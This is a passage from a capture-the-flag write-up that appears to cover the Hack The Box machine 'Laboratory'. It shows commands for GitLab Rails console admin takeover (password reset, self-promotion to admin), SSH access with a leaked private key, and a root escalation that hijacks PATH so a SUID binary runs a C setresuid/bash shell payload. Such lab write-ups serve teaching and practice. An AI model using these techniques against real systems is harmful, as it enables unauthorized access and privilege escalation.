-rw------- 1 root root 100761 Oct 20 18:54 /etc/gitlab/gitlab.rb

```

There’s a ton of cheatsheets out there for interacting with GitLab through the Gitlab-Rails console (like [this](https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html), [this](https://gist.github.com/dnozay/188f256839d4739ca3e4), and [this](http://vlabs.iitb.ac.in/gitlab/help/administration/troubleshooting/gitlab_rails_cheat_sheet.md)). Playing around a bit, I could enumerate the system.

I’ll start the console:

```

git@git:/$ gitlab-rails console
--------------------------------------------------------------------------------
GitLab:       12.8.1 (d18b43a5f5a) FOSS
GitLab Shell: 11.0.0
PostgreSQL:   10.12
--------------------------------------------------------------------------------
Loading production environment (Rails 6.0.2)
irb(main):001:0>

```

I can list the users, and the admin users:

```

irb(main):001:0> User.active
User.active
=> #<ActiveRecord::Relation [#<User id:5 @0xdf>, #<User id:4 @seven>, #<User id:1 @dexter>]>
irb(main):002:0> User.admins
User.admins
=> #<ActiveRecord::Relation [#<User id:1 @dexter>]>

```

### Access SecureDocker Project

#### Via Password Reset

Since dexter is the only admin, perhaps I could reset his password:

```

irb(main):003:0> dexter.password = '0xdf0xdf'
dexter.password = '0xdf0xdf'
=> "0xdf0xdf"
irb(main):004:0> dexter.password_confirmation = '0xdf0xdf'
dexter.password_confirmation = '0xdf0xdf'
=> "0xdf0xdf"
irb(main):005:0> dexter.save
dexter.save
Enqueued ActionMailer::DeliveryJob (Job ID: 568f2530-647b-4783-b5b7-6f3e37820ede) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007f77bb1e5660 @uri=#<URI::GID gid://gitlab/User/1>>
=> true

```

Now I can log in to git.laboratory.htb as dexter, and there’s an additional project:

![image-20210307054935384](https://0xdfimages.gitlab.io/img/image-20210307054935384.png)

#### Via Elevate Self

Alternatively, I could also give myself admin privs for GitLab:

```

irb(main):006:0> me = User.find_by(username: "0xdf")
me = User.find_by(username: "0xdf")
=> #<User id:5 @0xdf>
irb(main):007:0> me.admin = true
me.admin = true
=> true
irb(main):008:0> me.save
me.save
=> true

```

Now logged in as 0xdf, I can access the private project under Projects –> Explore.

### SSH

#### Find SSH Key

The project has a handful of files in it, most of which are not that interesting. There’s a `todo.txt`:

```

# DONE: Secure docker for regular users
### DONE: Automate docker security on startup
# TODO: Look into "docker compose"
# TODO: Permanently ban DeeDee from lab

```

I’ll note those for later. But more importantly there’s a `.ssh` folder in `dexter` and it has a private key in it:

![image-20210307061924490](https://0xdfimages.gitlab.io/img/image-20210307061924490.png)

#### Connect

Using the private key, I can get a shell as dexter:

```

oxdf@parrot$ ssh -i ~/keys/laboratory_dexter dexter@10.10.10.216
dexter@laboratory:~$

```

And get `user.txt`:

```

dexter@laboratory:~$ cat user.txt
47516221************************

```

## Shell as root

### Enumeration

Looking at the SUID binaries on the box, one jumped out as something custom to this box:

```

dexter@laboratory:~$ find / -perm -4000 -user root -ls 2>/dev/null | grep -v snap
     7838     20 -rwsr-xr-x   1 root     dexter             16720 Aug 28  2020 /usr/local/bin/docker-security
     2996    164 -rwsr-xr-x   1 root     root              166056 Jan 19 14:21 /usr/bin/sudo
     9426     44 -rwsr-xr-x   1 root     root               44784 May 28  2020 /usr/bin/newgrp
     1093     68 -rwsr-xr-x   1 root     root               67816 Apr  2  2020 /usr/bin/su
     2937     88 -rwsr-xr-x   1 root     root               88464 May 28  2020 /usr/bin/gpasswd
      672     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
     2932     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn
      892     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
     1163     40 -rwsr-xr-x   1 root     root               39144 Apr  2  2020 /usr/bin/umount
     2933     52 -rwsr-xr-x   1 root     root               53040 May 28  2020 /usr/bin/chsh
      824     56 -rwsr-xr-x   1 root     root               55528 Apr  2  2020 /usr/bin/mount
     2941     68 -rwsr-xr-x   1 root     root               68208 May 28  2020 /usr/bin/passwd
     1377     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
    14032     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1592     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
    11830    464 -rwsr-xr-x   1 root     root              473576 May 29  2020 /usr/lib/openssh/ssh-keysign

```

`/usr/local/bin/docker-security` is probably what was referenced in the `todo.txt` from the repo.

One interesting note that’s unrelated to solving the box - the only binary on the box from 2021 is `sudo`, which was likely patched for CVE-2021-3156).

### docker-security

I could pull this binary back and reverse it in Ghidra, but given this is an easy-rated box, I’ll start with `ltrace` (which fortunately is installed on this box):

```

dexter@laboratory:~$ ltrace docker-security 
setuid(0)                                                                               = -1
setgid(0)                                                                               = -1
system("chmod 700 /usr/bin/docker"chmod: changing permissions of '/usr/bin/docker': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                   = 256
system("chmod 660 /var/run/docker.sock"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                   = 256
+++ exited (status 0) +++

```

The binary is calling `system("chmod ...")`. The important part here is that it isn’t using the full path to `chmod`. That is something I can exploit.

### Shell

I don’t see any tools to compile a binary on Laboratory, so I’ll work on my VM. I’ll use this snippet of C code:

```

#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setresuid(0, 0, 0);
    system("/bin/bash");
}

```

It simply sets the process privs to root, and then calls `bash`. I don’t actually need the `setresuid` call, as `docker-security` actually calls `setuid(0)` and `setgid(0)` before calling `chmod`. This is just handy template I have around for cases like this, and many times a process will actually lower it’s privileges before making a risky call (and the `setresuid` fixes that for me).

I’ll compile this and copy it to Laboratory with `scp`:

```

oxdf@parrot$ gcc suid.c -o suid
oxdf@parrot$ scp -i ~/keys/laboratory_dexter suid dexter@10.10.10.216:/tmp/chmod
suid                                          100%   16KB 399.5KB/s   00:00

```

I’ll also update the `PATH` variable so that `/tmp` is the first directory checked:

```

dexter@laboratory:/tmp$ export PATH=/tmp:$PATH

```

When `docker-security` runs, when it makes the call to `chmod`, it will get the `chmod` binary from `/tmp`, which will return a shell:

```

dexter@laboratory:/tmp$ docker-security 
root@laboratory:/tmp#

```

And I can grab `root.txt`:

```

root@laboratory:/root# cat root.txt
9b147368************************

```